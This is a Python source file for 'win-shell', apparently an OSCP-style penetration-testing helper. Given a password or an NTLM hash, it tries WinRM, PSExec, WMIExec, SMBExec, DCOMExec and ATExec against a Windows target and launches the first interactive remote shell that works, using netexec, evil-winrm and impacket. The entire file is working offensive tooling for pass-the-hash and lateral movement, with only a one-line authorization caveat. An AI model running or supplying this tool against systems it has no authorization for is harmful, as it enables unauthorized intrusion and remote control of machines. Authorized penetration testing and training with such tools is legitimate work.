#!/usr/bin/env python3
"""
win-shell.py -  Windows remote-access helper - Tries common Windows remote execution methods and launches the first, interactive shell that succeeds.

$> sudo apt install netexec impacket-scripts && sudo gem install evil-winrm && chmod +x win-shell.py && sudo cp win-shell.py /usr/local/bin/win-shell #(Requirements)
$> win-shell -t 192.168.230.96 -u administrator -p 'Password123' #(Usage)
  
Other Examples:
  win-shell -t 10.10.10.10 -u administrator -p 'Password123'
  win-shell -t 10.10.10.10 -d DOMAIN.COM -u administrator -p 'Password123'
  win-shell -t 10.10.10.10 -u administrator -H 'NTHASH'
  win-shell -t 10.10.10.10 -d DOMAIN.COM -u administrator -H 'NTHASH'

Force a method:
  win-shell -t 10.10.10.10 -u admin -p 'Password' --method winrm
  win-shell -t 10.10.10.10 -u admin -p 'Password' --method psexec

Notes:
  - Only use against systems you are authorized to test.
  - ATExec is a command-execution fallback, not a true interactive shell.
"""

import argparse
import shutil
import subprocess
import sys


def die(msg):
    print(f"[-] {msg}")
    sys.exit(1)


def have(cmd):
    return shutil.which(cmd) is not None


def run_quiet(cmd, timeout=15):
    try:
        return subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout,
        )
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return None


def show_result(name, result):
    if result is None:
        print(f"[-] {name}: no response")
        return False
    output = result.stdout.strip()
    if output:
        lines = output.splitlines()
        for line in lines[-5:]:
            print(f"    {line}")
    return result.returncode == 0


def nxc_base(protocol, target, domain, user, password=None, ntlm=None):
    cmd = ["nxc", protocol, target, "-u", user]
    if domain:
        cmd += ["-d", domain]
    if ntlm:
        cmd += ["-H", ntlm]
    else:
        cmd += ["-p", password]
    return cmd


def impacket_target(domain, user, password=None, ntlm=None, target=None):
    prefix = f"{domain}/{user}" if domain else f"./{user}"
    if password is not None:
        return f"{prefix}:{password}@{target}"
    return f"{prefix}@{target}"


def launch(cmd, label):
    """Launch an interactive shell and report the truth about how it ended.

    Does NOT assume success just because the process was spawned - checks
    the real return code so a WinRMAuthorizationError (or similar late
    failure) is reported as a failure instead of silently exiting 0.
    """
    print(f"\n[+] {label} succeeded")
    print("[*] Launching interactive shell...\n")
    try:
        result = subprocess.run(cmd)
    except KeyboardInterrupt:
        print("\n[*] Shell interrupted by user.")
        sys.exit(0)
    except FileNotFoundError:
        print(f"[-] {label}: binary not found at launch time.")
        return False

    if result.returncode != 0:
        print(f"\n[-] {label} exited with error (code {result.returncode}).")
        print("[-] Likely an authorization/session issue that nxc's check "
              "didn't catch (e.g. account not in Remote Management Users, "
              "or evil-winrm/Ruby reline incompatibility hanging the shell).")
        return False

    sys.exit(0)


def test_winrm(args):
    if not have("nxc"):
        return False
    print("[*] Testing WinRM...")
    cmd = nxc_base("winrm", args.target, args.domain, args.user,
                    args.password, args.ntlm)
    result = run_quiet(cmd)
    if result is None or result.returncode != 0:
        print("[-] WinRM authentication failed/unavailable")
        return False
    cmd += ["-x", "whoami"]
    result = run_quiet(cmd)
    if result is not None and result.returncode == 0:
        print("[+] WinRM command execution confirmed")
        return True
    print("[-] WinRM authentication succeeded but command execution was not confirmed")
    return False


def launch_winrm(args):
    if not have("evil-winrm"):
        print("[-] evil-winrm is not installed")
        return False

    # Build -u exactly once. Domain accounts use DOMAIN\user; local accounts
    # use the bare username. Previous version passed -u twice.
    winrm_user = f"{args.domain}\\{args.user}" if args.domain else args.user
    cmd = ["evil-winrm", "-i", args.target, "-u", winrm_user]
    if args.ntlm:
        cmd += ["-H", args.ntlm]
    else:
        cmd += ["-p", args.password]

    return launch(cmd, "WinRM")


def test_nxc_exec(protocol, args):
    if not have("nxc"):
        return False
    print(f"[*] Testing {protocol.upper()} command execution...")
    cmd = nxc_base(protocol, args.target, args.domain, args.user,
                    args.password, args.ntlm)
    cmd += ["-x", "whoami"]
    result = run_quiet(cmd)
    return show_result(protocol.upper(), result)


def launch_impacket(tool, args, label):
    if not have(tool):
        print(f"[-] {tool} is not installed")
        return False
    target = impacket_target(
        args.domain, args.user, args.password, args.ntlm, args.target
    )
    cmd = [tool, target]
    if args.ntlm:
        cmd += ["-hashes", f":{args.ntlm}"]
    return launch(cmd, label)


def test_psexec(args):
    return test_nxc_exec("smb", args)


def test_wmi(args):
    return test_nxc_exec("wmi", args)


def test_smbexec(args):
    return test_nxc_exec("smb", args)


def test_dcom(args):
    tool = "impacket-dcomexec"
    if not have(tool):
        return False
    print("[*] Testing DCOM execution...")
    target = impacket_target(
        args.domain, args.user, args.password, args.ntlm, args.target
    )
    cmd = [tool, target, "cmd.exe"]
    if args.ntlm:
        cmd += ["-hashes", f":{args.ntlm}"]
    result = run_quiet(cmd, timeout=12)
    return result is not None and result.returncode == 0


def test_atexec(args):
    tool = "impacket-atexec"
    if not have(tool):
        return False
    print("[*] Testing ATExec / Task Scheduler...")
    target = impacket_target(
        args.domain, args.user, args.password, args.ntlm, args.target
    )
    cmd = [tool, target, "whoami"]
    if args.ntlm:
        cmd += ["-hashes", f":{args.ntlm}"]
    result = run_quiet(cmd, timeout=15)
    return result is not None and result.returncode == 0


def build_parser():
    p = argparse.ArgumentParser(
        description="Automatically find a working Windows remote shell method."
    )
    p.add_argument("-t", "--target", required=True, help="Target IP/hostname")
    p.add_argument("-u", "--user", required=True, help="Username")
    auth = p.add_mutually_exclusive_group(required=True)
    auth.add_argument("-p", "--password", help="Password")
    auth.add_argument("-H", "--ntlm", help="NTLM hash")
    p.add_argument("-d", "--domain", help="Domain name; omit for local account")
    p.add_argument(
        "--method",
        choices=["auto", "winrm", "psexec", "wmiexec", "smbexec", "dcomexec", "atexec"],
        default="auto",
        help="Force one method (default: auto)",
    )
    return p


def main():
    args = build_parser().parse_args()
    print(r"""
============================================================
                 WIN-SHELL / OSCP HELPER
============================================================
""")
    # No backslash inside f-string expressions (breaks on Python < 3.12) -
    # build the display string beforehand instead.
    user_display = f"{args.domain}\\{args.user}" if args.domain else args.user
    print(f"[*] Target : {args.target}")
    print(f"[*] User   : {user_display}")
    print(f"[*] Auth   : {'NTLM hash' if args.ntlm else 'password'}")
    print(f"[*] Method : {args.method}\n")

    required = {
        "winrm": ["nxc", "evil-winrm"],
        "psexec": ["nxc", "impacket-psexec"],
        "wmiexec": ["nxc", "impacket-wmiexec"],
        "smbexec": ["nxc", "impacket-smbexec"],
        "dcomexec": ["impacket-dcomexec"],
        "atexec": ["impacket-atexec"],
    }
    if args.method != "auto":
        missing = [x for x in required[args.method] if not have(x)]
        if missing:
            die("Missing: " + ", ".join(missing))

    # Preferred order: WinRM -> WMI -> PSExec -> SMBExec -> DCOM.
    # ATExec is tested last because it provides command execution, not a
    # native interactive shell.
    methods = ["winrm", "wmiexec", "psexec", "smbexec", "dcomexec", "atexec"]
    if args.method != "auto":
        methods = [args.method]

    for method in methods:
        if method == "winrm":
            if not test_winrm(args):
                continue
            if launch_winrm(args):
                sys.exit(0)
        elif method == "wmiexec":
            if not test_wmi(args):
                continue
            if launch_impacket("impacket-wmiexec", args, "WMIExec"):
                sys.exit(0)
        elif method == "psexec":
            if not test_psexec(args):
                continue
            if launch_impacket("impacket-psexec", args, "PSExec"):
                sys.exit(0)
        elif method == "smbexec":
            if not test_smbexec(args):
                continue
            if launch_impacket("impacket-smbexec", args, "SMBExec"):
                sys.exit(0)
        elif method == "dcomexec":
            if not test_dcom(args):
                continue
            if launch_impacket("impacket-dcomexec", args, "DCOMExec"):
                sys.exit(0)
        elif method == "atexec":
            if test_atexec(args):
                print("\n[+] ATExec command execution works")
                print("[!] ATExec does not provide a native interactive shell.")
                print("[*] Use --method atexec for command execution or use")
                print("    another successful interactive method.")
                sys.exit(0)

    print("\n[-] No interactive remote execution method succeeded.")
    print("[*] Continue with SMB/RPC/LDAP enumeration and credential hunting.")
    sys.exit(1)


if __name__ == "__main__":
    main()
